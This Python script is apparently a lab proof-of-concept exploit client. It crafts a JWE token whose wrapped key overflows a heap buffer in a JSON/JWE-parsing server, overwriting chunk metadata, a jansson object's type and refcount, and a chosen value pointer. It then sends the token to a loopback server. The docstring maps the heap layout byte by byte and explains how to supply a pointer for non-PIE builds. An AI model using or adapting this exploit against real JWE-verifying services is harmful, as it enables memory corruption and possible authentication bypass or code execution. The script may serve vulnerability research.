#!/usr/bin/env python3
"""W199/W202 loopback client: 72-byte chosen write with a live jansson value pointer.

The RFC 3394 plaintext maps one-to-one onto heap offsets past the 32-byte CEK:
  +32..39 "MISHE-OO"   (next chunk prev_size, ignored while in use)
  +40..47 0x31         (preserve next chunk size)
  +48..55 02/01        (JSON_STRING type and refcount of the adjacent object)
  +56..63 filler       (json_t padding)
  +64..71 pointer      (chosen value pointer, dereferenced as `enc` when the
                        adjacent string is the enc value: jwe.c:1098).
                        Defaults to 0x4141414141414141 (W199). W202 accepts
                        an optional third CLI argument: the little-endian
                        hex of a chosen pointer, e.g. 2ebd410000000000 for
                        the fixed "A128CBC-HS256" literal in -no-pie builds.
Sends one real HTTP GET to a loopback-only w1 server. No external contact.
"""
import importlib.util
import os
import socket
import sys

HERE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client.py")
spec = importlib.util.spec_from_file_location("w1client", HERE)
w1 = importlib.util.module_from_spec(spec)
spec.loader.exec_module(w1)

ptr = sys.argv[3] if len(sys.argv) > 3 else "4141414141414141"
plain = (b"\x5a" * 32 + b"MISHE-OO" +
         bytes.fromhex("3100000000000000") +
         bytes.fromhex("0200000001000000") +
         b"\x5a" * 8 +
         bytes.fromhex(ptr))

ek = w1.wrap(plain)
header = w1.b64u(b'{"alg":"A128KW","enc":"A128CBC-HS256"}')
token = ".".join((header, w1.b64u(ek), w1.b64u(b"\x11" * 16),
                  w1.b64u(b"\x22" * 48), w1.b64u(b"\x33" * 32)))
host, port = sys.argv[1], int(sys.argv[2])
req = ("GET /verify HTTP/1.1\r\nHost: " + host + "\r\nAuthorization: Bearer " +
       token + "\r\nUser-Agent: w181-loopback-consumer\r\nConnection: close\r\n\r\n").encode()
with socket.create_connection((host, port), timeout=5) as s:
    s.sendall(req)
    chunks = []
    while True:
        data = s.recv(4096)
        if not data:
            break
        chunks.append(data)
print("W199_PTR72 TOKEN_LEN=%d PTR=%s RESPONSE=%r" % (len(token), ptr, b"".join(chunks)[:100]))
